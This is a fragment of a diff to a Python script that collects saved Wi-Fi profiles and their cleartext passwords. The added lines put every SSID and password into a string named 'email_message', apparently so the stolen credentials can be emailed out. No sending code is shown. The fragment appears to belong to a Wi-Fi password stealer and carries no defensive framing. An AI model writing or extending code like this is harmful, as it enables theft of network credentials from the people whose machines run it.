@@ -22,3 +22,7 @@ if len(profile_names) != 0:
             else:
                 wifi_profile["password"] = password[1]
             wifi_list.append(wifi_profile)
+
+email_message = ""
+for item in wifi_list:
+    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
